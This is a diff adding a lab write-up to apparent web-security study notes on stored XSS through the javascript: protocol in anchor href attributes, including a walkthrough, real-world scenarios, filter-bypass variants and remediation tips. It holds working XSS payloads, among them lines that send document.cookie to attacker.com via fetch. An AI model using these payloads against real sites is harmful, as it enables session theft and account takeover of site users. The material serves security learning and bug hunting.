@@ -6273,3 +6273,422 @@ Ask:
 👉 Can I auto-trigger?  
 
 ---
+
+---
+
+# 🐞 Lab 16 — Stored XSS in Anchor href Attribute (javascript: Protocol)
+
+---
+
+## 🔹 Overview
+
+Stored Cross-Site Scripting (Stored XSS) occurs when:
+
+✔ User input is submitted to the server  
+✔ The server stores it (database)  
+✔ The stored input is later rendered to other users  
+✔ The browser executes it as code  
+
+---
+
+## ⚠️ Lab Conditions
+
+✔ Input is stored (comment system)  
+✔ Reflected later in page  
+✔ Appears inside anchor href attribute  
+
+```
+<a href="USER_INPUT">
+```
+
+❌ Double quotes are encoded  
+✔ Cannot break attribute  
+
+👉 BUT:
+
+✔ `href` itself is a scriptable context 😈  
+
+---
+
+## 🧠 Core Idea
+
+We don’t break HTML ❌  
+We modify the VALUE of href ✔  
+
+---
+
+## 🧠 What Is This Topic?
+
+Attribute-based Stored XSS  
+
+Where:
+
+👉 Certain attributes can directly execute JavaScript  
+
+---
+
+## 🔑 Dangerous Attributes
+
+```
+href
+src
+action
+formaction
+```
+
+---
+
+## 🔄 Flow
+
+1️⃣ User submits input  
+2️⃣ Server stores it  
+3️⃣ Page renders stored input  
+4️⃣ Input appears inside href  
+5️⃣ User clicks → JS executes  
+
+---
+
+## 🧠 Key Concept
+
+Not all XSS requires breaking context ❌  
+Sometimes the context itself is dangerous ✔  
+
+---
+
+## 🪜 Lab Walkthrough
+
+---
+
+### Step 1 — Open Lab
+
+Go to blog comment section  
+
+---
+
+### Step 2 — Test Reflection
+
+Enter in **Website field**:
+
+```
+XSS123
+```
+
+---
+
+### Step 3 — Observe Output
+
+```
+<a href="XSS123">AuthorName</a>
+```
+
+✔ Confirmed → input inside `href`  
+
+![input inside href](../images/stored-xss-href-reflection.png)
+
+---
+
+### Step 4 — Inject Payload
+
+Enter in Website field:
+
+```
+javascript:alert(1)
+```
+
+---
+
+### Step 5 — Verify in Response
+
+```
+<a href="javascript:alert(1)">AuthorName</a>
+```
+
+✔ Payload stored successfully  
+
+---
+
+### Step 6 — Trigger
+
+Go back to blog  
+Click author name  
+
+💥 alert(1) executes  
+
+![stored xss execution](../images/stored-xss-href-execution.png)
+
+---
+
+## ✅ Lab Solved
+
+---
+
+## 🧠 Payload Breakdown
+
+---
+
+### 🎯 Payload
+
+```
+javascript:alert(1)
+```
+
+---
+
+### 🔹 PART 1 — javascript:
+
+Special protocol  
+
+👉 Browser executes JS instead of navigating  
+
+---
+
+### 🔹 PART 2 — alert(1)
+
+JavaScript payload  
+
+---
+
+### 🎯 Combined Meaning
+
+Instead of opening link → execute JavaScript  
+
+---
+
+## 🪜 Execution Flow
+
+1️⃣ Payload stored in database  
+2️⃣ Server renders:
+
+```
+<a href="javascript:alert(1)">
+```
+
+3️⃣ User clicks link  
+4️⃣ Browser executes JS  
+5️⃣ XSS triggered 💥  
+
+---
+
+## 🧠 Key Learning
+
+If input is inside `href` → try:
+
+```
+javascript:
+```
+
+FIRST 🔥  
+
+---
+
+## 🌍 Real-World Scenarios
+
+---
+
+### 🟢 1️⃣ Comment Website Field
+
+```
+<a href="USER_INPUT">Author</a>
+```
+
+Payload:
+
+```
+javascript:alert(1)
+```
+
+---
+
+### 🟢 2️⃣ Profile Links
+
+```
+<a href="USER_INPUT">My Website</a>
+```
+
+Payload:
+
+```
+javascript:alert(document.domain)
+```
+
+---
+
+### 🟢 3️⃣ Redirect Parameters
+
+```
+<a href="next=USER_INPUT">
+```
+
+Payload:
+
+```
+javascript:alert(1)
+```
+
+---
+
+### 🟢 4️⃣ Admin Panel Links
+
+```
+<a href="USER_INPUT">View</a>
+```
+
+Payload:
+
+```
+javascript:fetch('https://attacker.com/'+document.cookie)
+```
+
+---
+
+### 🟢 5️⃣ Download Links
+
+```
+<a href="USER_INPUT">Download</a>
+```
+
+Payload:
+
+```
+javascript:location='https://evil.com'
+```
+
+---
+
+### 🟢 6️⃣ Messaging Systems
+
+```
+<a href="USER_INPUT">Click here</a>
+```
+
+Payload:
+
+```
+javascript:alert(1)
+```
+
+---
+
+### 🟢 7️⃣ CMS / Blogs (Stored XSS)
+
+```
+<a href="USER_INPUT">Author</a>
+```
+
+Payload:
+
+```
+javascript:alert(1)
+```
+
+✔ Affects ALL users  
+
+---
+
+## 🔥 Advanced Variations
+
+---
+
+### 🔴 1️⃣ Encoding Bypass
+
+```
+javascript:%61lert(1)
+```
+
+---
+
+### 🔴 2️⃣ Case Bypass
+
+```
+JaVaScRiPt:alert(1)
+```
+
+---
+
+### 🔴 3️⃣ Whitespace Trick
+
+```
+javascript:    alert(1)
+```
+
+---
+
+### 🔴 4️⃣ Newline Bypass
+
+```
+javascript:
+alert(1)
+```
+
+---
+
+### 🔴 5️⃣ Alternative Payload
+
+```
+javascript:confirm(1)
+```
+
+---
+
+### 🔴 6️⃣ Cookie Exfiltration
+
+```
+javascript:fetch('https://attacker.com?c='+document.cookie)
+```
+
+---
+
+## 🔗 Attack Chains
+
+---
+
+### 🔥 Account Takeover
+
+Steal session → login as victim  
+
+---
+
+### 🔥 Admin Compromise
+
+Admin clicks → full control 💀  
+
+---
+
+### 🔥 Data Exfiltration
+
+Steal sensitive data  
+
+---
+
+### 🔥 Phishing
+
+Redirect to fake login  
+
+---
+
+### 🔥 Worm Attack
+
+Auto-spread via comments  
+
+---
+
+## 🛡️ Remediation
+
+Disallow `javascript:` protocol  
+Allow only http/https  
+Validate URLs strictly  
+Sanitize input  
+Use CSP  
+
+---
+
+## 🧠 Bug Hunter Mindset
+
+Ask:
+
+👉 Is input inside `href`?  
+👉 Can I use `javascript:`?  
+👉 Is it stored or reflected?  
+👉 Who will click it?  
+
+---
